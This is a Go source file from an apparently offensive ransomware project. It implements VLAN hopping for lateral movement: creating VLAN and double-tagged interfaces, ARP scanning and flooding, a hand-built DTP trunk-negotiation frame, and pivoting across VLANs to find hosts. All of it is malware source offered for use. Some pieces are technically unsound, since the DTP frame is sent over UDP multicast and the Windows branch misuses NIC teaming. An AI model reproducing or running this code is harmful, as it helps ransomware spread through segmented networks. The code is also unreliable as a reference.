package ransomware

import rw "github.com/ruby570bocadito/x404x/internal/ransomware"

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type VLANJumper struct {
	config       *rw.RansomwareConfig
	interfaces   []string
	vlanRange    []int
	nativeVLAN   int
}

func NewVLANJumper(cfg *rw.RansomwareConfig) *VLANJumper {
	return &VLANJumper{
		config: cfg,
		vlanRange: []int{1, 10, 20, 50, 100, 200, 500, 1000},
		nativeVLAN: 1,
	}
}

func (v *VLANJumper) ListInterfaces() []string {
	if v.interfaces != nil {
		return v.interfaces
	}

	ifaces, err := net.Interfaces()
	if err != nil {
		return nil
	}

	var names []string
	for _, iface := range ifaces {
		if strings.HasPrefix(iface.Name, "eth") ||
			strings.HasPrefix(iface.Name, "enp") ||
			strings.HasPrefix(iface.Name, "ens") ||
			strings.HasPrefix(iface.Name, "wlan") {
			names = append(names, iface.Name)
		}
	}

	v.interfaces = names
	return names
}

func (v *VLANJumper) CreateVLANInterface(iface string, vlanID int) (string, error) {
	vlanName := fmt.Sprintf("%s.%d", iface, vlanID)

	if runtime.GOOS == "linux" {
		cmd := exec.Command("ip", "link", "add", "link", iface,
			"name", vlanName, "type", "vlan", "id", fmt.Sprintf("%d", vlanID))
		if out, err := cmd.CombinedOutput(); err != nil {
			return "", fmt.Errorf("create VLAN %d: %s — %v", vlanID, string(out), err)
		}

		exec.Command("ip", "link", "set", vlanName, "up").Run()
		return vlanName, nil
	}

	if runtime.GOOS == "windows" {
		cmd := exec.Command("powershell", "-Command",
			fmt.Sprintf("New-NetLbfoTeam -Name '%s' -TeamMembers '%s' -TeamingMode SwitchIndependent", vlanName, iface))
		cmd.Run()
	}

	return vlanName, nil
}

func (v *VLANJumper) RemoveVLANInterface(vlanName string) error {
	if runtime.GOOS == "linux" {
		return exec.Command("ip", "link", "delete", vlanName).Run()
	}
	return nil
}

func (v *VLANJumper) DHCPDiscoverOnVLAN(vlanIface string) (string, error) {
	if runtime.GOOS == "linux" {
		exec.Command("dhclient", "-v", vlanIface).Run()
		cmd := exec.Command("ip", "addr", "show", vlanIface)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return "", err
		}
		return string(out), nil
	}
	return "", fmt.Errorf("DHCP discover not supported on %s", runtime.GOOS)
}

func (v *VLANJumper) ARPScanOnVLAN(vlanIface string, subnet string) ([]string, error) {
	if runtime.GOOS == "linux" {
		cmd := exec.Command("arp-scan", "--interface", vlanIface, subnet)
		out, err := cmd.CombinedOutput()
		if err != nil {
			return nil, err
		}

		var hosts []string
		for _, line := range strings.Split(string(out), "\n") {
			fields := strings.Fields(line)
			if len(fields) >= 1 && strings.Count(fields[0], ".") == 3 {
				hosts = append(hosts, fields[0])
			}
		}
		return hosts, nil
	}
	return nil, fmt.Errorf("ARP scan not supported on %s", runtime.GOOS)
}

func (v *VLANJumper) DoubleTaggingAttack(iface string, innerVLAN, outerVLAN int) error {
	vlanName := v.CreateDoubleTaggedInterface(iface, innerVLAN, outerVLAN)

	if err := v.ARPFloodOnVLAN(vlanName); err != nil {
		return err
	}

	v.RemoveVLANInterface(vlanName)
	return nil
}

func (v *VLANJumper) CreateDoubleTaggedInterface(iface string, innerVLAN, outerVLAN int) string {
	if runtime.GOOS != "linux" {
		return iface
	}

	outerName := fmt.Sprintf("%s.%d", iface, outerVLAN)
	innerName := fmt.Sprintf("%s.%d", outerName, innerVLAN)

	exec.Command("ip", "link", "add", "link", iface, "name", outerName,
		"type", "vlan", "id", fmt.Sprintf("%d", outerVLAN)).Run()
	exec.Command("ip", "link", "set", outerName, "up").Run()

	exec.Command("ip", "link", "add", "link", outerName, "name", innerName,
		"type", "vlan", "id", fmt.Sprintf("%d", innerVLAN)).Run()
	exec.Command("ip", "link", "set", innerName, "up").Run()

	return innerName
}

func (v *VLANJumper) ARPFloodOnVLAN(vlanIface string) error {
	for i := 0; i < 10; i++ {
		cmd := exec.Command("arping", "-I", vlanIface, "-c", "1", "255.255.255.255")
		cmd.Run()
		time.Sleep(200 * time.Millisecond)
	}
	return nil
}

func (v *VLANJumper) DTPNegotiation(iface string) (bool, error) {
	if runtime.GOOS != "linux" {
		return false, fmt.Errorf("DTP requires Linux raw sockets")
	}

	DTPMulticastMAC := []byte{0x01, 0x00, 0x0C, 0xCC, 0xCC, 0xCC}
	DTPFrame := []byte{
		0x01, 0x00, 0x0C, 0xCC, 0xCC, 0xCC,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x20, 0x04,
		0xAA, 0xAA, 0x03,
		0x00, 0x00, 0x0C,
		0x20, 0x04,
		0x00, 0x01,
		0x54, 0x52, 0x55, 0x4E, 0x4B,
		0x00, 0x01, 0x00, 0x09,
		0x03, 0x0A, 0x04, 0x00, 0x00, 0x0C, 0x01, 0x07,
	}

	conn, err := net.Dial("udp", "224.0.0.1:0")
	if err != nil {
		return false, err
	}
	defer conn.Close()

	copy(DTPFrame[6:12], DTPMulticastMAC)
	conn.Write(DTPFrame)

	return true, nil
}

func (v *VLANJumper) PivotViaDiscoveredVLANs() (int, error) {
	ifaces := v.ListInterfaces()
	if len(ifaces) == 0 {
		return 0, fmt.Errorf("no interfaces found")
	}

	vlaned := 0
	for _, iface := range ifaces {
		for _, vlanID := range v.vlanRange {
			vlanName, err := v.CreateVLANInterface(iface, vlanID)
			if err != nil {
				continue
			}

			hosts, _ := v.ARPScanOnVLAN(vlanName,
				fmt.Sprintf("192.168.%d.0/24", vlanID%254+1))

			if len(hosts) > 0 {
				vlaned++
			}

			v.RemoveVLANInterface(vlanName)
		}
	}

	return vlaned, nil
}

func (v *VLANJumper) FullVLANJumpSuite() map[string]interface{} {
	result := make(map[string]interface{})

	ifaces := v.ListInterfaces()
	result["interfaces"] = ifaces
	result["vlan_range"] = v.vlanRange

	pivoted, err := v.PivotViaDiscoveredVLANs()
	if err != nil {
		result["pivot_error"] = err.Error()
	} else {
		result["vlans_with_hosts"] = pivoted
	}

	if runtime.GOOS == "linux" {
		cmd := exec.Command("ip", "link", "show", "type", "vlan")
		out, _ := cmd.CombinedOutput()
		result["existing_vlans"] = strings.Count(string(out), "vlan")
	}

	return result
}

var _ = net.Interfaces
